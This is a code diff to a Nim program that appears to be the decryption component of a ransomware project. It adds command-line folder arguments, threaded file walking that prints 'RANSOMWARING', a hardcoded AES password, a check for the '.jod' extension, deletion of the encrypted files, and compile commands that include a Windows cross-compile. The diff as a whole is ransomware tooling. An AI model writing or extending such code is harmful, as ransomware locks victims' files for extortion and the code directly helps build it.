@@ -2,15 +2,23 @@ import nimAesCrypt
 import os
 import strenc
 import threadpool
+import std/os
+
+# COMPILE: nim --threads:on -d:release c canRun.nim
+# For Windows: nim --threads:on -d:release --os:windows --cpu:amd64 --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc c canRun.nim
+# RUN: nim --threads:on -d:release r canRun.nim ./somefolder/ ./sensfold/
 
 proc DecryptFile(file: string) =
   {.gcsafe.}:
-    echo file[^4..^1] & " " & file[1..^5]
-    if(file[^4..^1] != ".aes"):
+    #echo file[^4..^1] & " " & file[0..^5]
+    if(file[^4..^1] != ".jod"):
         echo "File is not encrypted: " & file
         return
     let password = "THISISACOMPLEXPASSWRD_201334354357"
     let decryptedFile = file[0..^5]
+    if not fileExists(file):
+        echo "File not present ", file
+        return
     decryptFile(file, decryptedFile,password,1024)
     removeFile(file)
     echo "File decrypted"
@@ -41,7 +49,22 @@ proc main() =
     #     echo "Dir created: ./decryptedFolder/"
     # else:
     #     echo "Dir already exists"
-    fileWalk("./sensitiveFolder/")
+    var filename = "./sensitiveFolder"
+    var files : seq[string]
+    if paramCount() > 0:
+        for counter in 1..paramCount():    
+          files.add(paramStr(counter))
+          filename=paramStr(counter)
+          if dirExists(filename):
+              echo "Will Decrypt files in: ", filename
+          else:
+              echo "Folder does not exist: ", filename,"\nPlease enter a proper folder path. Preferably the full path."
+              return
+    else:
+      files.add(filename)
+    for file in files:
+      echo "RANSOMWARING " & file
+      spawn fileWalk(file)
     sync()
 
 
